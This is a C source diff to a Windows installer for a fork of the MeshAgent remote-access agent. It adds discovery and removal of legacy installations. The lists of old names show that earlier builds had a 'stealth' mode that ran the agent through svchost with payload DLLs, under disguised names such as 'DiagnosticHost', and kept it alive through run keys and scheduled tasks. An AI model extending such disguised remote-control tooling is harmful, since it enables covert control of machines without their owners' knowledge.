@@ -195,6 +195,7 @@ static BOOL ServiceDeploy_VerifyServiceHostServiceBinding(const wchar_t* service
 static BOOL ServiceDeploy_StartServiceHostServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs);
 static void ServiceDeploy_RecordServiceDllHash(const wchar_t* serviceName, const wchar_t* dllPath);
 static void ServiceDeploy_RemoveInactiveServiceHostPayloadDlls(const ServiceInstallPaths* paths);
+static size_t ServiceDeploy_CleanupLegacyInstallations(const ServiceInstallPaths* currentPaths, const wchar_t* activeServiceName);
 static BOOL ServiceDeploy_BuildLifecycleMutexName(wchar_t* mutexName, size_t mutexNameCch);
 static BOOL ServiceDeploy_QueryLifecycleOperationActive(BOOL* activeOut);
 static BOOL ServiceDeploy_CreateRecoveryStartupAuthorization(HANDLE* eventOut);
@@ -928,6 +929,583 @@ static size_t ServiceDeploy_CleanupConflictingServiceAliases(const ServiceInstal
     }
 
     return cleanupCount;
+}
+
+// ================================================================
+// Legacy Installation Discovery and Cleanup
+// ================================================================
+//
+// Previous MeshAgent versions (and the upstream MeshCentral agent) may have
+// installed to different paths, used different DLL/EXE names, or registered
+// under different service key names. When the current branding changes any
+// of those, the old installation becomes an orphan that the normal alias
+// scanner (which only looks within the current install root) will not find.
+//
+// This section discovers and cleans up legacy installations so that install,
+// uninstall, update, and server-driven update all work cleanly regardless of
+// what previous version was on the machine.
+
+typedef struct LegacyInstallRecord
+{
+    wchar_t serviceName[256];
+    wchar_t installDir[MAX_PATH];
+    wchar_t dllPath[MAX_PATH * 4];
+    BOOL    serviceFound;
+    BOOL    filesOnly;
+} LegacyInstallRecord;
+
+#define LEGACY_INSTALL_MAX_RECORDS 16
+
+/* Names sourced from git history, upstream MeshCentral agent-installer.js,
+ * stealth_defaults.h, service_defaults.h, and MeshCentral server paths. */
+
+static const wchar_t* const g_LegacyServiceNames[] = {
+    L"MeshAgent",                   /* STEALTH_FALLBACK / SERVICE_FALLBACK_SERVICE_NAME (C default) */
+    L"Mesh Agent",                  /* JS installer default on Windows: meshServiceName fallback */
+    L"MeshAgentDiagnostic",         /* agent-installer.js: serviceName + 'Diagnostic' */
+    L"Mesh AgentDiagnostic",        /* agent-installer.js: 'Mesh Agent' + 'Diagnostic' */
+    L"DiagnosticHost",              /* legacy diagnostic host service name */
+};
+
+static const wchar_t* const g_LegacyDllNames[] = {
+    L"meshsvc.dll",                 /* SERVICE_FALLBACK_DLL_NAME / STEALTH_FALLBACK_DLL_NAME */
+    L"MeshService-2022.dll",        /* build output DLL (MeshServiceBundle configuration) */
+    L"svchost_payload.dll",         /* embedded svchost payload candidate at install root */
+    L"diagsvc.dll",                 /* legacy diagnostic service DLL */
+};
+
+static const wchar_t* const g_LegacyExeNames[] = {
+    L"meshagent.exe",               /* SERVICE_FALLBACK_EXE_NAME / STEALTH_FALLBACK_EXE_NAME */
+    L"MeshAgent.exe",               /* JS installer target on Windows */
+    L"MeshService.exe",             /* MeshCentral meshcentral-data/agents (32-bit) */
+    L"MeshService64.exe",           /* MeshCentral meshcentral-data/agents (64-bit) */
+    L"MeshService-2022.exe",        /* build output EXE (StealthLab configuration) */
+};
+
+static const wchar_t* const g_LegacyDbNames[] = {
+    L"meshagent.db",                /* SERVICE_FALLBACK_DB_NAME / STEALTH_FALLBACK_DB_NAME */
+};
+
+static const wchar_t* const g_LegacyConfNames[] = {
+    L"meshagent.conf",              /* SERVICE_FALLBACK_CONF_NAME / STEALTH_FALLBACK_CONF_NAME */
+    L"meshagent.msh",               /* .msh provisioning file (lowercase) */
+    L"MeshAgent.msh",               /* .msh provisioning file (MeshCentral server naming) */
+};
+
+static const wchar_t* const g_LegacyLogNames[] = {
+    L"meshagent.log",               /* SERVICE_FALLBACK_LOG_NAME / STEALTH_FALLBACK_LOG_NAME */
+    L"integration.log",             /* service_integration.c log output */
+    L"meshagent_kvm_startup.log",   /* KVM startup diagnostic log (written to %TEMP% but may appear here) */
+    L"controlchannel-debug.log",    /* upstream MeshCentral agent debug log */
+    L"svchost-debug.log",           /* svchost-mode debug log */
+};
+
+static const wchar_t* const g_LegacyMiscNames[] = {
+    L"meshagent.proxy",             /* agent-installer.js proxy file (lowercase) */
+    L"MeshAgent.proxy",             /* agent-installer.js proxy file (Windows target casing) */
+};
+
+static const wchar_t* ServiceDeploy_wcsistr(const wchar_t* haystack, const wchar_t* needle)
+{
+    size_t needleLen;
+    if (haystack == NULL || needle == NULL) { return NULL; }
+    needleLen = wcslen(needle);
+    if (needleLen == 0) { return haystack; }
+    for (; *haystack; ++haystack)
+    {
+        if (_wcsnicmp(haystack, needle, needleLen) == 0) { return haystack; }
+    }
+    return NULL;
+}
+
+static BOOL ServiceDeploy_PathContainsLeafInsensitive(const wchar_t* path, const wchar_t* leaf)
+{
+    const wchar_t* found;
+    size_t leafLen;
+    if (path == NULL || leaf == NULL) { return FALSE; }
+    leafLen = wcslen(leaf);
+    found = path;
+    while ((found = ServiceDeploy_wcsistr(found, leaf)) != NULL)
+    {
+        if (found == path || found[-1] == L'\\' || found[-1] == L'/' || found[-1] == L'"')
+        {
+            wchar_t after = found[leafLen];
+            if (after == L'\0' || after == L'"' || after == L',' || after == L' ') { return TRUE; }
+        }
+        found += leafLen;
+    }
+    return FALSE;
+}
+
+/* Extract the executable path (first token) from a service ImagePath command
+ * line. Handles the common quoted form ("C:\dir with spaces\app.exe" args) and
+ * the unquoted form (C:\dir\app.exe args). Used to recover the install directory
+ * of legacy standalone-EXE services so their files can be cleaned up. */
+static BOOL ServiceDeploy_ExtractExecutableFromCommand(const wchar_t* command, wchar_t* exeOut, size_t exeOutCch)
+{
+    const wchar_t* p;
+    const wchar_t* start;
+    const wchar_t* end;
+    size_t len;
+    if (command == NULL || exeOut == NULL || exeOutCch == 0) { return FALSE; }
+    exeOut[0] = L'\0';
+    p = command;
+    while (*p == L' ' || *p == L'\t') { ++p; }
+    if (*p == L'"')
+    {
+        start = p + 1;
+        end = wcschr(start, L'"');
+        if (end == NULL) { return FALSE; }
+    }
+    else
+    {
+        start = p;
+        end = start;
+        while (*end != L'\0' && *end != L' ' && *end != L'\t') { ++end; }
+    }
+    len = (size_t)(end - start);
+    if (len == 0 || len + 1 > exeOutCch) { return FALSE; }
+    memcpy(exeOut, start, len * sizeof(wchar_t));
+    exeOut[len] = L'\0';
+    return TRUE;
+}
+
+static BOOL ServiceDeploy_IsLegacyMeshAgentService(const wchar_t* serviceName, wchar_t* dllPathOut, size_t dllPathOutCch)
+{
+    wchar_t command[MAX_PATH * 4] = {0};
+    wchar_t parsedDll[MAX_PATH] = {0};
+    wchar_t serviceMain[128] = {0};
+    wchar_t rawDll[MAX_PATH * 4] = {0};
+
+    if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+    if (ServiceDeploy_QueryServiceImagePathW(serviceName, command, _countof(command)))
+    {
+        if (ServiceHost_ParseImagePath(command, parsedDll, _countof(parsedDll)) && parsedDll[0] != L'\0')
+        {
+            if (dllPathOut != NULL) { StringCchCopyW(dllPathOut, dllPathOutCch, parsedDll); }
+            return TRUE;
+        }
+        /* Check for old Stealth_SvchostServiceMain callback in the image path. */
+        if (wcsstr(command, L",Stealth_SvchostServiceMain") != NULL)
+        {
+            if (dllPathOut != NULL && dllPathOutCch > 0) { dllPathOut[0] = L'\0'; }
+            return TRUE;
+        }
+        /* Check for known legacy DLL names in a rundll32 image path. Covers
+         * DLLs that use a different export name than MeshServiceHostW. */
+        if (ServiceDeploy_wcsistr(command, L"rundll32") != NULL)
+        {
+            for (size_t d = 0; d < _countof(g_LegacyDllNames); ++d)
+            {
+                if (ServiceDeploy_PathContainsLeafInsensitive(command, g_LegacyDllNames[d]))
+                {
+                    if (dllPathOut != NULL && dllPathOutCch > 0) { dllPathOut[0] = L'\0'; }
+                    return TRUE;
+                }
+            }
+        }
+        /* Check for legacy standalone EXE service (no DLL, EXE runs directly).
+         * Recover the executable's full path from the ImagePath so the caller
+         * can derive the install directory and clean up the files. */
+        for (size_t i = 0; i < _countof(g_LegacyExeNames); ++i)
+        {
+            if (ServiceDeploy_PathContainsLeafInsensitive(command, g_LegacyExeNames[i]))
+            {
+                if (dllPathOut != NULL && dllPathOutCch > 0)
+                {
+                    wchar_t exePath[MAX_PATH] = {0};
+                    /* Only trust the extracted path when it actually ends in the
+                     * matched EXE leaf (guards against unquoted paths with spaces
+                     * that the first-token extractor would truncate). */
+                    if (ServiceDeploy_ExtractExecutableFromCommand(command, exePath, _countof(exePath)) &&
+                        ServiceDeploy_PathContainsLeafInsensitive(exePath, g_LegacyExeNames[i]))
+                    {
+                        StringCchCopyW(dllPathOut, dllPathOutCch, exePath);
+                    }
+                    else
+                    {
+                        dllPathOut[0] = L'\0';
+                    }
+                }
+                return TRUE;
+            }
+        }
+    }
+
+    /* Check svchost shared-process Parameters\ServiceDll + ServiceMain. */
+    if (ServiceDeploy_ReadServiceParameterString(serviceName, L"ServiceMain", serviceMain, _countof(serviceMain)) &&
+        (_wcsicmp(serviceMain, L"ServiceHost_ServiceMain") == 0 ||
+         _wcsicmp(serviceMain, L"Stealth_SvchostServiceMain") == 0) &&
+        ServiceDeploy_ReadServiceParameterString(serviceName, L"ServiceDll", rawDll, _countof(rawDll)))
+    {
+        wchar_t expanded[MAX_PATH] = {0};
+        DWORD count = ExpandEnvironmentStringsW(rawDll, expanded, _countof(expanded));
+        if (count > 0 && count < _countof(expanded) && expanded[0] != L'\0')
+        {
+            if (dllPathOut != NULL) { StringCchCopyW(dllPathOut, dllPathOutCch, expanded); }
+            return TRUE;
+        }
+        /* Expansion failed or overflowed — skip rather than returning
+         * an unexpanded %VAR% string that would bypass path comparisons. */
+        return FALSE;
+    }
+
+    return FALSE;
+}
+
+static BOOL ServiceDeploy_ExtractDirectoryFromPath(const wchar_t* filePath, wchar_t* dirOut, size_t dirOutCch)
+{
+    const wchar_t* lastSep;
+    size_t dirLen;
+    if (filePath == NULL || dirOut == NULL || dirOutCch == 0) { return FALSE; }
+    dirOut[0] = L'\0';
+    lastSep = wcsrchr(filePath, L'\\');
+    if (lastSep == NULL) { lastSep = wcsrchr(filePath, L'/'); }
+    if (lastSep == NULL || lastSep == filePath) { return FALSE; }
+    dirLen = (size_t)(lastSep - filePath);
+    if (dirLen + 1 > dirOutCch) { return FALSE; }
+    memcpy(dirOut, filePath, dirLen * sizeof(wchar_t));
+    dirOut[dirLen] = L'\0';
+    return TRUE;
+}
+
+static void ServiceDeploy_AddLegacyRecord(
+    LegacyInstallRecord* records, size_t capacity, size_t* count,
+    const wchar_t* serviceName, const wchar_t* installDir, const wchar_t* dllPath,
+    BOOL serviceFound, BOOL filesOnly)
+{
+    if (*count >= capacity) { return; }
+    /* Deduplicate: only merge a files-only record into a service record for the
+     * same directory. Two different services sharing the same directory each get
+     * their own record so both are unregistered from SCM. */
+    if (installDir != NULL && installDir[0] != L'\0')
+    {
+        for (size_t i = 0; i < *count; ++i)
+        {
+            if (records[i].installDir[0] != L'\0' && _wcsicmp(records[i].installDir, installDir) == 0)
+            {
+                if (!serviceFound && records[i].serviceFound)
+                {
+                    /* Files-only record for a directory that already has a service record — skip. */
+                    return;
+                }
+                if (serviceFound && !records[i].serviceFound)
+                {
+                    /* Upgrade files-only record to service record. */
+                    records[i].serviceFound = TRUE;
+                    records[i].filesOnly = FALSE;
+                    if (serviceName != NULL) { StringCchCopyW(records[i].serviceName, _countof(records[i].serviceName), serviceName); }
+                    if (dllPath != NULL) { StringCchCopyW(records[i].dllPath, _countof(records[i].dllPath), dllPath); }
+                    return;
+                }
+                /* Both are service records — fall through to add a second record
+                 * so both services get unregistered. File cleanup only runs on
+                 * the first record (the second shares installDir). */
+            }
+        }
+    }
+    ZeroMemory(&records[*count], sizeof(records[*count]));
+    if (serviceName != NULL) { StringCchCopyW(records[*count].serviceName, _countof(records[*count].serviceName), serviceName); }
+    if (installDir != NULL) { StringCchCopyW(records[*count].installDir, _countof(records[*count].installDir), installDir); }
+    if (dllPath != NULL) { StringCchCopyW(records[*count].dllPath, _countof(records[*count].dllPath), dllPath); }
+    records[*count].serviceFound = serviceFound;
+    records[*count].filesOnly = filesOnly;
+    ++(*count);
+}
+
+static size_t ServiceDeploy_DiscoverLegacyInstallations(
+    const ServiceInstallPaths* currentPaths,
+    const wchar_t* activeServiceName,
+    LegacyInstallRecord* records,
+    size_t capacity)
+{
+    HKEY hServices = NULL;
+    DWORD index = 0;
+    size_t count = 0;
+
+    /* Phase 1: Scan all SCM services for MeshAgent DLLs at paths outside the
+     * current install root. This catches renamed services and moved installs. */
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services", 0, KEY_ENUMERATE_SUB_KEYS, &hServices) == ERROR_SUCCESS)
+    {
+        while (count < capacity)
+        {
+            wchar_t serviceName[512] = {0};
+            wchar_t dllPath[MAX_PATH * 4] = {0};
+            wchar_t installDir[MAX_PATH] = {0};
+            DWORD serviceNameCch = (DWORD)_countof(serviceName);
+            LSTATUS enumStatus = RegEnumKeyExW(hServices, index, serviceName, &serviceNameCch, NULL, NULL, NULL, NULL);
+
+            if (enumStatus == ERROR_NO_MORE_ITEMS) { break; }
+            if (enumStatus != ERROR_SUCCESS) { ++index; continue; }
+
+            /* Skip the active service. */
+            if (activeServiceName != NULL && activeServiceName[0] != L'\0' && _wcsicmp(serviceName, activeServiceName) == 0)
+            { ++index; continue; }
+
+            if (ServiceDeploy_IsLegacyMeshAgentService(serviceName, dllPath, _countof(dllPath)))
+            {
+                /* Skip services whose DLL is inside the current install root (alias scanner handles those). */
+                if (dllPath[0] != L'\0' && currentPaths != NULL && currentPaths->installDir[0] != L'\0' &&
+                    ServiceDeploy_PathStartsWithDirectoryInsensitive(dllPath, currentPaths->installDir))
+                { ++index; continue; }
+
+                if (dllPath[0] != L'\0' && ServiceDeploy_ExtractDirectoryFromPath(dllPath, installDir, _countof(installDir)))
+                {
+                    ServiceDeploy_AddLegacyRecord(records, capacity, &count, serviceName, installDir, dllPath, TRUE, FALSE);
+                }
+                else
+                {
+                    /* Service found but cannot determine install dir from DLL path; still record it for service cleanup. */
+                    ServiceDeploy_AddLegacyRecord(records, capacity, &count, serviceName, L"", dllPath, TRUE, FALSE);
+                }
+            }
+            ++index;
+        }
+        RegCloseKey(hServices);
+    }
+
+    /* Phase 2: Probe known legacy install directories for remnant files. */
+    {
+        wchar_t expandedPath[MAX_PATH] = {0};
+        const wchar_t* legacyRootPatterns[] = {
+            L"%ProgramFiles%\\Mesh Agent",
+            L"%ProgramFiles(x86)%\\Mesh Agent",
+            L"%ProgramData%\\Mesh Agent",
+            L"%ProgramData%\\MeshAgent",
+            L"%ProgramData%\\DiagnosticHost",      /* legacy diagnostic host install path */
+            L"%PUBLIC%\\Documents\\MeshAgent",     /* KVM startup log path (git: service_host.c) */
+        };
+
+        for (size_t r = 0; r < _countof(legacyRootPatterns) && count < capacity; ++r)
+        {
+            DWORD expandCount = ExpandEnvironmentStringsW(legacyRootPatterns[r], expandedPath, _countof(expandedPath));
+            if (expandCount == 0 || expandCount >= _countof(expandedPath)) { continue; }
+
+            /* Skip the current install root (use path-prefix comparison to handle
+             * trailing-separator differences between branding config and expanded env). */
+            if (currentPaths != NULL && currentPaths->installDir[0] != L'\0' &&
+                (ServiceDeploy_PathStartsWithDirectoryInsensitive(expandedPath, currentPaths->installDir) ||
+                 ServiceDeploy_PathStartsWithDirectoryInsensitive(currentPaths->installDir, expandedPath))) { continue; }
+
+            if (GetFileAttributesW(expandedPath) == INVALID_FILE_ATTRIBUTES) { continue; }
+
+            /* Check for any DLL or EXE with a known MeshAgent name. */
+            BOOL hasRemnant = FALSE;
+            for (size_t d = 0; d < _countof(g_LegacyDllNames) && !hasRemnant; ++d)
+            {
+                wchar_t probe[MAX_PATH] = {0};
+                if (MeshInstaller_CombinePath(probe, _countof(probe), expandedPath, g_LegacyDllNames[d]) &&
+                    GetFileAttributesW(probe) != INVALID_FILE_ATTRIBUTES)
+                {
+                    hasRemnant = TRUE;
+                }
+            }
+            for (size_t e = 0; e < _countof(g_LegacyExeNames) && !hasRemnant; ++e)
+            {
+                wchar_t probe[MAX_PATH] = {0};
+                if (MeshInstaller_CombinePath(probe, _countof(probe), expandedPath, g_LegacyExeNames[e]) &&
+                    GetFileAttributesW(probe) != INVALID_FILE_ATTRIBUTES)
+                {
+                    hasRemnant = TRUE;
+                }
+            }
+            if (hasRemnant)
+            {
+                ServiceDeploy_AddLegacyRecord(records, capacity, &count, NULL, expandedPath, NULL, FALSE, TRUE);
+            }
+        }
+    }
+
+    /* Phase 3: Check for known legacy service names that weren't found by the SCM scan
+     * (service may have been deleted but registry key tree and files remain). */
+    for (size_t n = 0; n < _countof(g_LegacyServiceNames) && count < capacity; ++n)
+    {
+        wchar_t keyPath[512] = {0};
+        HKEY hKey = NULL;
+
+        if (activeServiceName != NULL && _wcsicmp(g_LegacyServiceNames[n], activeServiceName) == 0) { continue; }
+
+        /* Already discovered by SCM scan? */
+        BOOL alreadyFound = FALSE;
+        for (size_t i = 0; i < count; ++i)
+        {
+            if (records[i].serviceFound && _wcsicmp(records[i].serviceName, g_LegacyServiceNames[n]) == 0) { alreadyFound = TRUE; break; }
+        }
+        if (alreadyFound) { continue; }
+
+        /* Check for orphaned state registry tree. */
+        if (SUCCEEDED(StringCchPrintfW(keyPath, _countof(keyPath), L"SOFTWARE\\Open Source\\%ls", g_LegacyServiceNames[n])) &&
+            RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
+        {
+            RegCloseKey(hKey);
+            ServiceDeploy_AddLegacyRecord(records, capacity, &count, g_LegacyServiceNames[n], L"", NULL, FALSE, FALSE);
+        }
+    }
+
+    return count;
+}
+
+static void ServiceDeploy_CleanupLegacyRecord(const LegacyInstallRecord* record)
+{
+    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+
+    ServiceDeploy_LogInstallEvent(L"[LEGACY] Cleaning up legacy installation (service=%ls dir=%ls dll=%ls serviceFound=%u filesOnly=%u)",
+        record->serviceName[0] ? record->serviceName : L"(none)",
+        record->installDir[0] ? record->installDir : L"(none)",
+        record->dllPath[0] ? record->dllPath : L"(none)",
+        record->serviceFound,
+        record->filesOnly);
+
+    /* Stop and unregister the legacy service. */
+    if (record->serviceName[0] != L'\0')
+    {
+        wchar_t displayName[256] = {0};
+        ServiceDeploy_GetServiceDisplayNameForCleanup(record->serviceName, displayName, _countof(displayName));
+
+        if (record->serviceFound)
+        {
+            ServiceDeploy_ClearServiceRecovery(record->serviceName);
+            ServiceDeploy_RemoveRunKeyEntry(record->serviceName);
+            ServiceDeploy_RemoveScheduledTasks(persistence, displayName, record->serviceName);
+            (void)ServiceDeploy_StopServiceAndWait(record->serviceName, 30000, TRUE);
+
+            if (record->dllPath[0] != L'\0')
+            {
+                ServiceDeploy_TerminateProcessesByLoadedModulePath(record->dllPath);
+            }
+
+            /* For standalone-EXE legacy services (no DLL), terminate the EXE process
+             * directly so it cannot restart via recovery before we unregister. */
+            if (record->dllPath[0] == L'\0' && record->installDir[0] != L'\0')
+            {
+                wchar_t exePath[MAX_PATH] = {0};
+                for (size_t e = 0; e < _countof(g_LegacyExeNames); ++e)
+                {
+                    if (MeshInstaller_CombinePath(exePath, _countof(exePath), record->installDir, g_LegacyExeNames[e]))
+                    {
+                        ServiceDeploy_TerminateProcessesByPath(exePath);
+                    }
+                }
+            }
+
+            if (!ServiceHost_UnregisterServiceHostService(record->serviceName))
+            {
+                ServiceDeploy_LogInstallEvent(L"[LEGACY] Failed to unregister legacy service %ls (error=%lu)", record->serviceName, GetLastError());
+            }
+
+            (void)Security_RemoveFirewallRuleForService(record->serviceName);
+        }
+
+        /* Clean up orphaned state registry even for services already removed from SCM. */
+        (void)ServiceDeploy_DeleteServiceStateRegistryTree(record->serviceName);
+    }
+
+    /* Remove files at the legacy install directory. */
+    if (record->installDir[0] != L'\0' && GetFileAttributesW(record->installDir) != INVALID_FILE_ATTRIBUTES)
+    {
+        size_t i;
+        wchar_t filePath[MAX_PATH] = {0};
+
+        for (i = 0; i < _countof(g_LegacyDllNames); ++i)
+        {
+            if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, g_LegacyDllNames[i]))
+            {
+                (void)ServiceDeploy_RemoveFileIfExistsWithTimeout(filePath, 30000, TRUE);
+            }
+        }
+        for (i = 0; i < _countof(g_LegacyExeNames); ++i)
+        {
+            if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, g_LegacyExeNames[i]))
+            {
+                ServiceDeploy_TerminateProcessesByPath(filePath);
+                Security_RemoveFirewallRulesByExePath(filePath);
+                (void)ServiceDeploy_RemoveFileIfExistsWithTimeout(filePath, 30000, TRUE);
+            }
+        }
+        for (i = 0; i < _countof(g_LegacyDbNames); ++i)
+        {
+            if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, g_LegacyDbNames[i]))
+            {
+                (void)ServiceDeploy_RemoveFileIfExists(filePath, TRUE);
+            }
+        }
+        for (i = 0; i < _countof(g_LegacyConfNames); ++i)
+        {
+            if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, g_LegacyConfNames[i]))
+            {
+                (void)ServiceDeploy_RemoveFileIfExists(filePath, TRUE);
+            }
+        }
+        for (i = 0; i < _countof(g_LegacyLogNames); ++i)
+        {
+            if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, g_LegacyLogNames[i]))
+            {
+                (void)ServiceDeploy_RemoveFileIfExists(filePath, TRUE);
+            }
+        }
+        /* Legacy svchost.exe remnant. */
+        if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, L"svchost.exe"))
+        {
+            ServiceDeploy_TerminateProcessesByPath(filePath);
+            Security_RemoveFirewallRulesByExePath(filePath);
+            (void)ServiceDeploy_RemoveFileIfExistsWithTimeout(filePath, 30000, TRUE);
+        }
+        /* Proxy and misc files (agent-installer.js). */
+        for (i = 0; i < _countof(g_LegacyMiscNames); ++i)
+        {
+            if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, g_LegacyMiscNames[i]))
+            {
+                (void)ServiceDeploy_RemoveFileIfExists(filePath, TRUE);
+            }
+        }
+        /* Update staging files (meshcore/agentcore.c: ".update.exe"). */
+        if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, L".update.exe"))
+        {
+            (void)ServiceDeploy_RemoveFileIfExists(filePath, TRUE);
+        }
+        /* Legacy state files. */
+        if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, L"state.dat"))
+        {
+            (void)ServiceDeploy_RemoveFileIfExists(filePath, TRUE);
+        }
+
+        /* Remove state and logs subdirectories. */
+        if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, L"state"))
+        {
+            (void)ServiceDeploy_RemoveDirectoryTree(filePath, TRUE);
+        }
+        if (MeshInstaller_CombinePath(filePath, _countof(filePath), record->installDir, L"logs"))
+        {
+            (void)ServiceDeploy_RemoveDirectoryTree(filePath, TRUE);
+        }
+
+        /* Remove the legacy install root only if it is now empty. */
+        (void)RemoveDirectoryW(record->installDir);
+    }
+
+    ServiceDeploy_LogInstallEvent(L"[LEGACY] Legacy installation cleanup completed for %ls",
+        record->serviceName[0] ? record->serviceName : record->installDir);
+}
+
+static size_t ServiceDeploy_CleanupLegacyInstallations(const ServiceInstallPaths* currentPaths, const wchar_t* activeServiceName)
+{
+    LegacyInstallRecord records[LEGACY_INSTALL_MAX_RECORDS];
+    size_t count, i;
+
+    ZeroMemory(records, sizeof(records));
+    count = ServiceDeploy_DiscoverLegacyInstallations(currentPaths, activeServiceName, records, _countof(records));
+
+    if (count == 0) { return 0; }
+
+    ServiceDeploy_LogInstallEvent(L"[LEGACY] Discovered %Iu legacy installation(s) to clean up", count);
+
+    for (i = 0; i < count; ++i)
+    {
+        ServiceDeploy_CleanupLegacyRecord(&records[i]);
+    }
+
+    return count;
 }
 
 // ================================================================
@@ -3457,6 +4035,16 @@ static BOOL ServiceDeploy_ApplyUninstallFlow(void)
 
     if (!ServiceDeploy_RemoveDirectoryTree(stateDirPath, TRUE)) { success = FALSE; }
 
+    /* Clean up any legacy installations at different paths or under different
+     * service names left by previous MeshAgent/MeshCentral versions. */
+    {
+        size_t legacyCleaned = ServiceDeploy_CleanupLegacyInstallations(&paths, serviceKeyName);
+        if (legacyCleaned > 0)
+        {
+            ServiceDeploy_LogInstallEvent(L"[LEGACY] Cleaned up %Iu legacy installation(s) during uninstall", legacyCleaned);
+        }
+    }
+
     ServiceDeploy_LogInstallEvent(L"Complete uninstallation finished for %ls", serviceKeyName);
 
     ServiceDeploy_SetInstallerLogPathToTemp(L"MeshInstaller-Uninstall.log");
@@ -3572,6 +4160,7 @@ static BOOL ServiceDeploy_ApplyUpdateFlow(const wchar_t* sourceExePath, const wc
         ServiceDeploy_LogInstallEvent(L"[UPDATE] Failed to resolve install paths");
         return FALSE;
     }
+
     if (!ServiceBinding_QueryExists(serviceKeyName, &serviceExists))
     {
         ServiceDeploy_LogInstallEvent(L"[UPDATE] Unable to inspect incumbent service; aborting before mutation");
@@ -3611,6 +4200,24 @@ static BOOL ServiceDeploy_ApplyUpdateFlow(const wchar_t* sourceExePath, const wc
     {
         ServiceDeploy_LogInstallEvent(L"[UPDATE] Package preflight failed: invalid runtime DLL source (%ls)", sourceDllPath);
         return FALSE;
+    }
+
+    /* Clean up legacy installations at different paths or under different
+     * service names. Runs after preflight so no services are removed when
+     * the update package itself is invalid. */
+    {
+        size_t removedAliases = ServiceDeploy_CleanupConflictingServiceAliases(&paths, serviceKeyName);
+        if (removedAliases > 0)
+        {
+            ServiceDeploy_LogInstallEvent(L"[UPDATE] [ALIAS] Removed %Iu conflicting service alias(es) before update", removedAliases);
+        }
+    }
+    {
+        size_t legacyCleaned = ServiceDeploy_CleanupLegacyInstallations(&paths, serviceKeyName);
+        if (legacyCleaned > 0)
+        {
+            ServiceDeploy_LogInstallEvent(L"[UPDATE] [LEGACY] Cleaned up %Iu legacy installation(s) before update", legacyCleaned);
+        }
     }
 
     if (serviceExists)
